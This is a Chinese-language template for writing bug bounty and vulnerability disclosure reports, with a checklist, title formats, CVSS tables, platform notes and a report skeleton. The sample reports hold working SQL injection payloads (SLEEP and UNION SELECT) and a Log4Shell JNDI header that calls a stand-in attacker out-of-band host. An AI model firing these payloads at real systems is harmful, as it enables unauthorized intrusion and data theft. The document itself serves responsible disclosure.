# SRC 报告提交模板

> 适用：HackerOne、Bugcrowd、补天、漏洞盒子、CNVD、私域 SRC
> 三段式：标题 / 重现 / 影响——审核员 30 秒内能判分

---

## 0. 提交前自检 10 项

按下 Submit 之前逐项打勾：

- [ ] 标题符合 `[等级][条件][类型] 端点 - 一句话` 格式
- [ ] 资产在 program scope（看 policy 页）
- [ ] 复现步骤逐条编号，含完整 HTTP 请求/响应
- [ ] 至少 1 张响应截图 + 1 张 URL 可见的截图
- [ ] 副作用证据（外带 / 数据 / 文件 / 命令输出）
- [ ] 至少 3 次复现成功（关键漏洞 5 次）
- [ ] CVSS 3.1 / 4.0 vector + 影响段
- [ ] 修复建议（具体 + 可操作）
- [ ] 未对生产数据造成不可逆影响
- [ ] 个人 PII / 第三方数据已脱敏

---

## 1. 标题模板

```
[严重等级][条件][漏洞类型] 端点 - 一句话描述
```

示例：

```
[Critical][未授权][RCE] /api/v1/import 接受 ${jndi:} - 单包打穿
[High][认证后][SQLi] /api/search?q= UNION 注入 - 可读 admin hash
[High][越权][IDOR] /api/orders/{id} 横向遍历他人订单
[Medium][CSRF] /api/email/change 缺 token + SameSite=None
[Critical][默认凭据] Spring Boot Actuator /heapdump - 泄露 DB 密码
```

平台映射：

| 平台 | 严重度 |
|------|------|
| HackerOne | None / Low / Medium / High / Critical（CVSS 自动转） |
| Bugcrowd | VRT P1 / P2 / P3 / P4 / P5 |
| 补天 | 严重 / 高 / 中 / 低 |
| CNVD | 超危 / 高危 / 中危 / 低危 |

---

## 2. 主体三段式

### Section 1：漏洞概要（Summary）

```markdown
## 漏洞概要

**类型**：SQL 注入（认证后，时间盲）
**位置**：`POST /api/search` 的 `keyword` 参数
**严重程度**：High
**CVSS 3.1**：8.1（`AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`）
**先决条件**：拥有有效注册账号（免费注册）
**影响范围**：可拖出 users 表 / 读 admin 密码 hash

一句话：`POST /api/search` 的 `keyword` 参数未经参数化进入 SQL 查询，
攻击者可注入 SELECT 语句读取数据库任意内容。
```

### Section 2：复现步骤（Steps to Reproduce）

```markdown
## 复现步骤

### 环境
- 测试时间：2025-05-09 14:30 UTC
- 测试账号：hunter_test01（攻击者控制）
- 目标域名：target.com

### Step 1：登录获取 token

请求：

POST /api/login HTTP/1.1
Host: target.com
Content-Type: application/json

{"email":"hunter+a@example.com","password":"<已脱敏>"}

响应：

{"token":"eyJhbGc...（前 12 字符）"}

### Step 2：触发时间盲注（基线对比）

**真条件包**：

POST /api/search HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGc...
Content-Type: application/json

{"keyword":"x' AND (SELECT SLEEP(5))-- -"}

响应时间：5.21s

**假条件包**：

POST /api/search HTTP/1.1
{"keyword":"x' AND (SELECT SLEEP(0))-- -"}

响应时间：0.08s

### Step 3：5 次复现稳定性

| 次数 | 真条件 | 假条件 | 差异 |
|-----|-------|-------|-----|
| 1 | 5.21s | 0.09s | 5.12s |
| 2 | 5.18s | 0.07s | 5.11s |
| 3 | 5.31s | 0.08s | 5.23s |
| 4 | 5.22s | 0.09s | 5.13s |
| 5 | 5.19s | 0.08s | 5.11s |

### Step 4：数据外带（仅做版本探测，未拖库）

POST /api/search HTTP/1.1
{"keyword":"x' UNION SELECT 1,2,version()-- -"}

响应：[{"id":1,"name":2,"info":"5.7.34-log"}]

我未尝试拖出表数据 / 读取 admin 密码 hash / outfile 写文件。
```

### Section 3：影响 + 修复（Impact + Remediation）

```markdown
## 影响

- **数据库版本**：MySQL 5.7.34
- **可达范围**：当前数据库（prod_main）的所有表
- **可拖数据**：users、orders、payments 表（推断含 PII / 财务）
- **可升级**：通过 LOAD_FILE 读取 /etc/passwd（如 FILE 权限）→ 信息泄露
- **业务影响**：用户隐私泄露、合规风险（GDPR / CCPA）

## 修复建议

### 短期（立即）
- 在 `/api/search` 接口对 `keyword` 参数使用参数化查询（PreparedStatement / `?` 占位符）
- 临时部署 WAF 规则拦截常见 SQL 关键字

### 中期（1 周内）
- 全站 SQL 拼接代码审计，统一改用 ORM / 参数化
- 启用 query 日志监控异常 SQL

### 长期
- 数据库账号最小权限（仅 SELECT 单表）
- 引入 SQL 注入静态扫描（CI 集成）

## 我未做的事

- 未拖出任何表的真实数据
- 未尝试 LOAD_FILE / OUTFILE
- 未读取 admin 密码 hash
- 未对其他端点做注入测试

可应贵方安全团队要求做进一步演示。
```

---

## 3. 附件清单

每份报告建议附 4–6 类材料：

```
attachments/
├── 01-poc-screenshot.png         # 漏洞总览截图
├── 02-burp-flow.png               # Burp 流量截图
├── 03-recording.mp4               # 30s–2min 录屏（P0/P1 强烈建议）
├── 04-poc.py                      # 复现脚本（如有）
├── 05-dns-log.txt                 # OOB 平台日志（SSRF / RCE 必备）
└── 06-cvss-calc.png               # CVSS 计算器截图
```

---

## 4. CVSS 速查表（按漏洞类型预填）

```
未授权 RCE                AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
认证后 RCE                AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
未授权 SQLi（拖库）        AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
认证 SQLi                  AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N = 8.1
未授权数据导出 / IDOR      AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
任意文件读                 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
任意文件写 → RCE           AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
未授权 SSRF + 元数据       AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
JWT alg=none / 伪造        AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
垂直越权（提权 admin）     AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H = 8.8
水平越权（IDOR）           AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5
密码重置接管               AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N = 9.1
价格篡改                   AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N = 6.5
存储 XSS（管理后台）        AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1
反射 XSS                   AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N = 6.1
开放重定向                 AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N = 4.7
.git 泄露                  AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N = 7.5
.env 泄露生产凭据           AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
默认凭据后台               AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8
HTTP smuggling             AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N = 9.0
竞态金融超扣               AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N = 6.5
```

---

## 5. 不同平台的格式调整

### HackerOne

- 标题用英文（除非项目允许中文）
- Severity 选 None / Low / Medium / High / Critical
- Asset 必须从下拉选择
- 复现包用 H1 的 attachment 上传
- Triager 看不懂中文 → 关键信息双语

### Bugcrowd

- 用 VRT 分类（Server-Side Injection / Authentication / ...）
- VRT 分级 P1–P5 对应赏金区间
- attachment 支持 + Markdown 友好

### 补天 / 漏洞盒子

- 中文 OK
- 漏洞类型按平台分类下拉
- 通用型 vs 事件型，通用型走 CNVD/CNNVD 编号
- 复现 PoC 必须脱敏

### CNVD

- 通用型：厂商联系方式、影响范围、可复现 PoC
- 事件型：URL、抓包、复现步骤
- 所有真实 IP / 域名 / 数据必须脱敏

---

## 6. 报告语气

DO：
- 客观、可复现、可量化
- 主动说"我没做什么"
- 提具体修复建议（"在第 N 行加 PreparedStatement"）
- 留联系方式以便复测

DON'T：
- 威胁 / 索赔 / 公开 / 媒体压力
- "你们公司安全做得真烂"
- "如果不修我就发推"
- 多漏洞硬塞一篇报告（每个独立漏洞独立提交）

---

## 7. 跟进流程

```
提交（Day 0）
  ↓
Triage（1–7 天）：审核员判断"有效 / 需更多信息 / 重复 / 拒收"
  ↓
Resolved（1–60 天）：开发修复
  ↓
赏金（修复后或 triage 后）
  ↓
Disclosure（默认 90 天后或厂商同意）
```

被 closed-as-duplicate / 信息不全：

- 用 Burp 的 raw HTTP 请求重发证明
- 提供新的 IP / 时间戳 / 不同测试账号
- 不要重复提交（封号风险）

被 closed-as-N/A / Out of scope：

- 仔细看 program policy
- 必要时礼貌申诉，附 scope 解读
- 不要刷分

---

## 8. 一份完整骨架（可直接复制改）

```markdown
# [Critical][未授权][RCE] /api/v1/import - 单包 ${jndi:} 打穿

## 漏洞概要
- 类型：JNDI 注入 (Log4Shell 类)
- 位置：POST /api/v1/import 的 X-Api-Version Header
- 严重程度：Critical
- CVSS：9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
- 先决条件：无（公开端点）
- 影响：远程代码执行，无需认证

## 环境
- 测试时间：2025-05-09 14:30 UTC
- 攻击者 OOB：abc.attacker-oob.cc（研究员控制）

## 复现步骤

### Step 1：发送注入 Payload

POST /api/v1/import HTTP/1.1
Host: target.com
X-Api-Version: ${jndi:dns://test.abc.attacker-oob.cc/a}

### Step 2：验证 OOB 触发

DNS log（attacker-oob.cc 后台）：
2025-05-09 14:30:42 UTC | source 3.x.x.x | query test.abc.attacker-oob.cc

source IP 3.x.x.x 经反查为 target.com 的出口 IP。

### Step 3：5 次复现稳定性
全部成功，平均触发延时 < 1s。

## 影响
1. 远程代码执行（基于 Log4Shell 经典 chain）
2. 完整服务器控制
3. 可读取 /etc/passwd、配置文件、AWS 元数据等

## 我未做的事
- 未实际加载远程类 / 反弹 shell
- 仅 DNS 外带证明触发
- 未读取任何配置文件

## 修复建议
1. 立即升级 log4j-core 至 2.17.1+
2. 设置 -Dlog4j2.formatMsgNoLookups=true
3. 部署 WAF 规则拦截 ${jndi: 模式

## 附件
- 01-burp-poc.png（请求 + 响应）
- 02-dns-log.png（OOB 日志）
- 03-recording.mp4（2 分钟录屏）
```

---
